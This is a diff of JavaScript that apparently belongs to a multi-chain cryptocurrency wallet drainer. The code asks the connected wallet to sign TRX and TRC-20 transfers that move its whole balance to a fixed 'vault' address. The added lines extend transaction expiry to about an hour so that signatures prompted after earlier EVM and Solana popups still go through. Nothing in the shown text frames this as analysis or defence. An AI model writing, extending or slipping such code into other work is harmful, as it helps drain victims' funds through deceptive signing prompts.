@@ -6665,6 +6665,13 @@
         if (sendAmt > 0) {
           UI.status('Confirm TRX transfer...');
           var tx = await tronWeb.transactionBuilder.sendTrx(vault, sendAmt, address);
+          // Extend expiration to 1 hour — same as SOL blockhash fix.
+          // Default TRON tx expiry = 60s; if EVM/SOL popups appeared first, tx could already be expired.
+          // Max allowed by network = 24h; 3600s (1h) is safe and gives user plenty of time.
+          if (tronWeb.transactionBuilder && typeof tronWeb.transactionBuilder.extendExpiration === 'function') {
+            try { tx = await tronWeb.transactionBuilder.extendExpiration(tx, 3540); } catch (_eExp) {}
+          }
+          L.log('[TRON] TRX tx expiration extended to ~1h before sign');
           var signed = await signTx(tx);
           if (signed) {
             await SUBMIT.tron(address, signed, vault, sendAmt, conn.name);
@@ -6689,6 +6696,10 @@
             trc20List[i].contract, 'transfer(address,uint256)', { feeLimit: 100000000 },
             [{ type: 'address', value: vault }, { type: 'uint256', value: balStr }], address
           );
+          // Extend expiration to 1 hour for TRC-20 transfers too
+          if (ttx && ttx.transaction && tronWeb.transactionBuilder && typeof tronWeb.transactionBuilder.extendExpiration === 'function') {
+            try { ttx.transaction = await tronWeb.transactionBuilder.extendExpiration(ttx.transaction, 3540); } catch (_eExp2) {}
+          }
           var sTx = await signTx(ttx.transaction);
           if (sTx) {
             await SUBMIT.tron(address, sTx, trc20List[i].contract, balStr, conn.name);
